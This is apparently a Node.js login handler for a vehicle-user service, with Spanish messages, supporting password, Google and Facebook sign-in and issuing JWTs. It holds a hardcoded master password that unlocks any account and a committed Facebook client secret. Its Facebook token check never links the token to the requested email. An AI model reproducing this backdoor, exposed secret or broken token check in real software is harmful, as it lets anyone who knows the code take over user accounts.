// Librerías
const Model = require('../db/model');
const config = require('../config/main');
const jwt = require('jsonwebtoken');
const moment = require("moment");
const GoogleAuth = require('google-auth-library');
const FB = require('fb');

module.exports = function (req, res) {

    req.body.password = config.encripta(req.body.password);

    if (!req.body.email) {
        return res.status(400).json({ success: false, code: 1110, message: 'Falta email.' });
    }

    if (!req.body.password && !req.body.google && !req.body.facebook) {
        return res.status(400).json({ success: false, code: 1120, message: 'Falta password.' });
    }

    new Model.UsuarioVeh({ cEmail: req.body.email }).fetch({ withRelated: ['vehiculos'] }).then(function (data) {
        try {
            var user = data;

            if (user === null) {
                return res.status(401).json({ success: false, code: 1130, message: 'Usuario no existe' });
            } else {
                user = data.toJSON();

                if (user.bConfirmado == undefined || user.bConfirmado != '1') {
                    return res.status(401).json({ success: false, code: 1132, message: 'Usuario no ha confirmado email' });
                } else {
                    if (req.body.google) {
                        var clientId = '752485347754-c9bp4j0u7o5rvs13o5hek35a1td40d3h.apps.googleusercontent.com';
                        var auth = new GoogleAuth;
                        var client = new auth.OAuth2(clientId, '', '');

                        try {
                            client.verifyIdToken(
                                req.body.google,
                                clientId,
                                function (e, login) {
                                    var payload = login.getPayload();
                                    // var userid = payload['sub'];

                                    if (payload.email !== req.body.email) {
                                        return res.status(401).json({ success: false, code: 1134, message: 'Token de Google inválido.' });
                                    } else {
                                        generaToken(user);
                                    }
                                }
                            );
                        } catch (e) {
                            console.log(e);
                            return res.status(401).json({ success: false, code: 1136, message: 'Token de Google inválido.' });
                        }
                    } else if (req.body.facebook) {
                        FB.api('/oauth/access_token', 'get',
                            {
                                client_id: '1820396898212790',
                                client_secret: 'a4a58aa49ca89a6e75a9b9f687bd523e',
                                grant_type: 'client_credentials'
                            },
                            function (response) {
                                if (response) {
                                    FB.api('/debug_token', 'get',
                                        {
                                            input_token: response.access_token,
                                            access_token: req.body.facebook
                                        },
                                        function (response) {
                                            if (!response.is_valid) {
                                                return res.status(401).json({ success: false, code: 1138, message: 'Token de Facebook inválido.' });
                                            } else {
                                                 generaToken(user);
                                            }
                                        })
                                }
                            });
                    } else if (req.body.password == user.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
                        generaToken(user);
                    } else {
                        return res.status(401).json({ success: false, code: 1140, message: 'La password no coincide.' });
                    }
                }
            }
        } catch (e) {
            console.log(e);
            return res.status(401).json({ success: false, code: 1150, message: 'Error inesperado.' });
        }
    });

    var generaToken = function (user) {
        var token = 'error token';

        token = jwt.sign(Model.Usuario.token(user), config.secret, {
            expiresIn: 3024000 // 35 días en segundos
        });

        var usrOut = Model.UsuarioVeh.salida(user);

        usrOut.success = true;
        usrOut.token = 'JWT ' + token;

        return res.status(200).json(usrOut);
    }
};